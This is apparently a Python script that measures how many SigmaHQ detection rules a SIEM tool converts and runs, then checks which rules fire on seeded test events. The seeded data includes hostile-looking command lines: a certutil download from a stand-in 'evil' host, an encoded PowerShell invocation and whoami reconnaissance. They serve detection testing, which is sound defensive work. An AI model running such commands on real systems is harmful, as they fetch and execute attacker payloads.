"""Sigma coverage report: convert a SigmaHQ checkout through siempl's new pySigma path.

Usage: .venv/bin/python scripts/sigma_coverage.py [/path/to/sigma/rules]
Prints: converted/unsupported by reason and by path (sql|kql), SQL execution errors on an EMPTY schema DB,
match-everything count, and a seeded-attack check through the real RuleRunner.
"""
import collections
import glob
import os
import re
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
os.environ.setdefault("SIEMPL_HOME", tempfile.mkdtemp())

from siempl.db import Database, utcnow
from siempl.detect.engine import RuleRunner, RuleStore, UnsupportedRule, sigma_to_rule

ROOT = sys.argv[1] if len(sys.argv) > 1 else "/tmp/sigmahq/rules"
CATS = ("process_creation", "file_event", "network_connection", "dns_query")

files = sorted(glob.glob(os.path.join(ROOT, "**/*.yml"), recursive=True))
db = Database(os.path.join(tempfile.mkdtemp(), "cov.duckdb"))
by_path, reasons, sql_errors, trivial = collections.Counter(), collections.Counter(), [], 0
rules = []
for f in files:
    with open(f) as fh:
        txt = fh.read()
    m = re.search(r"^\s*category:\s*(\w+)", txt, re.M)
    if not m or m.group(1) not in CATS:
        continue
    by_path["in_scope"] += 1
    try:
        r = sigma_to_rule(txt, f)
    except UnsupportedRule as e:
        reasons[str(e)[:80]] += 1
        continue
    except Exception as e:
        reasons["EXC " + repr(e)[:70]] += 1
        continue
    by_path["converted_" + (r.get("query_lang") or "kql")] += 1
    rules.append((f, r))
    if r.get("query_lang") == "sql":
        try:
            db.cursor().execute(f'SELECT * FROM ({r["query"]}) _r WHERE _r."TimeGenerated" > now()').fetchall()
        except Exception as e:
            sql_errors.append((os.path.basename(f), str(e).split("\n")[0][:100]))
    if re.search(r"\(\s*true\s*\)\s*$", r["query"]):
        trivial += 1

print(dict(by_path))
print("unsupported reasons:", reasons.most_common(6))
print("SQL execution errors on empty schema:", len(sql_errors), sql_errors[:3])
print("match-everything (trivial true) rules:", trivial)

# seeded attacks
now = utcnow()
db.insert_events("ProcessEvents", [
    {"TimeGenerated": now, "SourceId": "x", "ProcessPath": "C:\\Windows\\System32\\WHOAMI.EXE", "ProcessName": "WHOAMI.EXE", "ProcessCmdLine": "WHOAMI /all", "HostName": "h1"},
    {"TimeGenerated": now, "SourceId": "x", "ProcessPath": "C:\\Windows\\System32\\cmd.exe", "ProcessName": "cmd.exe", "ProcessCmdLine": "cmd.exe /c certutil -urlcache -f http://evil/x.exe", "HostName": "h1"},
    {"TimeGenerated": now, "SourceId": "x", "ProcessPath": "C:\\Windows\\System32\\powershell.exe", "ProcessName": "powershell.exe", "ProcessCmdLine": "powershell -enc SQBFAFgA", "HostName": "h2"},
])
store = RuleStore(db)
ids = {}
for f, r in rules:
    r = dict(r); r["enabled"] = True; r["lookback_minutes"] = 60
    ids[store.create(r)] = os.path.basename(f)
runner = RuleRunner(db)
fired = []
for rid, name in ids.items():
    try:
        if runner.run_rule(rid):
            fired.append(name)
    except Exception:
        pass
errs = db.query_one("SELECT count(*) c FROM rules WHERE last_error IS NOT NULL")["c"]
print("rules that fired on 3 seeded events via RuleRunner:", len(fired), "| rules with runtime errors:", errs)
print(sorted(fired)[:12])
err_reasons = collections.Counter(re.sub(r"\s+", " ", (x["last_error"] or ""))[:110] for x in db.query("SELECT last_error FROM rules WHERE last_error IS NOT NULL"))
print("runtime error reasons:", err_reasons.most_common(5))
